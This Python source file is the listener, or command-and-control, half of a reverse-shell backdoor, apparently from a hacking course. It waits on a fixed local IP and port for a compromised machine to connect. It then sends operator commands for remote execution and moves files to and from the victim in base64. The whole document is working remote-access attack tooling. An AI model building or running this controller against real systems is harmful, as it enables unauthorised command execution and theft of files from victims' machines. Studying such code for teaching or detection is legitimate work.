#Python3 Listener
#!/usr/bin/env python
import socket #library used to create connection and listen to incoming connection
import json
import base64
class Listner:
    def __init__(self, ip, port):
        listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 0)  # This will allow us to resuse a socket
        listener.bind((ip, port))
        listener.listen(0)
        print("[+] Waiting for incoming connections")
        self.connection, address = listener.accept()
        print("[+] Connection established from " + str(address))

    def reliable_send(self, data):
        json_data = json.dumps(data)
        self.connection.send(json_data.encode())

    def reliable_recieve(self):
        json_data = b""
        while True:
            try:
                json_data = json_data +  self.connection.recv(1024)
                return json.loads(json_data)
            except ValueError:
                continue


    def execute_remotley(self, command):
        self.reliable_send(command)
        if command[0] == "exit":
            self.connection.close()
            exit()
        return self.reliable_recieve()

    def write_file(self, path, content):
        with open(path, "wb") as file:
            file.write(base64.b64decode(content))
            return "[+] Download successful"

    def read_file(self, path):
        with open(path, "rb") as file:
            return base64.b64encode(file.read())
    def run(self):
        while True:
            command = input("[>>] ")
            command = command.split(" ")
            #try:
            if command[0] == "upload":
                file_content = self.read_file(command[1])
                command.append(file_content.decode())

            result = self.execute_remotley(command)
            if command[0] == "download" and "[-] Error " not in result:
                result = self.write_file(command[1], result)
            print(result)
            #except Exception:
            #    result = "[-] Error during command execution."

mylistener = Listner("192.168.1.187", 8888)
mylistener.run()




